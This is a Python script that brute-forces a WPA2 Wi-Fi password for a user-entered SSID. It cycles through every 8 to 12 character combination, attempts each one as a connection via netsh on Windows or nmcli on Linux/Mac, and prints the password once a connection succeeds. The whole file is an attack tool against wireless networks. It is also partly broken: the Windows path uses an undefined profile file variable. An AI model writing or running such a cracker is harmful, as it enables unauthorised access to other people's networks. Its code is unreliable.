import itertools , subprocess , time
chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 
         'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 
         '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '_', '!', '~',
         '`', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=',
         '+', '/', '?', '.', '>', '<', ',', '\\', '|', '"', "'", ':', ';',
         '[', ']', '{', '}', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I',
         'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z']
min_length = 8
max_length = 12 
# Windows
def windows_connect(ssid, password) :
    try:
        with open(profile_path, 'w') as f:
            f.write(f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <hex>{ssid.encode().hex()}</hex>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>''')
        subprocess.run(['netsh', 'wlan', 'add', 'profile', f'filename={profile_path}'], check=True)
        subprocess.run(['netsh', 'wlan', 'connect', f'name={ssid}'], check=True)
        time.sleep(5)
        print(f"✅ Connected to {ssid} successfully!\nPassword : {password}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"❌ Failed to connect: {e}\nPassword : {password}")
        return False
# Linux & Mac
def linux_connect(ssid, password) :
    try:
        subprocess.run(['nmcli', 'device', 'wifi', 'connect', ssid, 'password', password], check=True)
        time.sleep(5)
        print(f"✅ Connected to {ssid} successfully!\nPassword : {password}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"❌ Failed to connect: {e}\nPassword : {password}")
        return False 
def Test_Password(OS, ssid):
    if OS == 'Win' :
        num = 0
        for length in range(min_length, max_length + 1):
            for combo in itertools.product(chars, repeat=length):
                s = ''.join(combo)
                try_connect = windows_connect(ssid, s)
                if try_connect == True :
                    return 
                else :
                    pass
                print(f'try : {num}')
                num += 1
                if s == 'ZZZZZZZZZZZZ':
                    return
    elif OS == 'Lin' :
        num = 0
        for length in range(min_length, max_length + 1):
            for combo in itertools.product(chars, repeat=length):
                s = ''.join(combo)
                try_connect = linux_connect(ssid, s)
                if try_connect == True :
                    return 
                else :
                    pass
                print(f'try : {num}')
                num += 1
                if s == 'ZZZZZZZZZZZZ':
                    return
import os
if os.name == 'posix':
    print("OS : Linux/Mac")
    ssid = input('Enter SSID => ')
    Test_Password('Lin' , ssid)
elif os.name == 'nt':
    print("OS : Windows")
    ssid = input('Enter SSID => ')
    Test_Password('Win' , ssid)
else:
    print("ERROR : OS_NOT_FOUND")